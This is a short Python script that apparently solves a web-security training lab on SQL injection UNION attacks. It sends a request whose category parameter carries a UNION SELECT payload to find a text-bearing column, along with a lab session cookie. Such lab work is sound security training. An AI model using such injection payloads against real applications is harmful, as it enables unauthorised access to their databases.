# SQL injection UNION attack, finding a column containing text
# Make the database retrieve the string: 'zKd0Kd'

import requests

url = "https://0ab500a6049f8163c058307500ec0076.web-security-academy.net/"
cookies = dict(session="61IQdwBf4y1HCHDQWsUVYKL9Dx4su11M")
params = dict(category="' UNION SELECT NULL,'zKd0Kd',NULL-- -")

r = requests.get(url + "filter", params=params, cookies=cookies)
print(r.status_code)
print(r.text)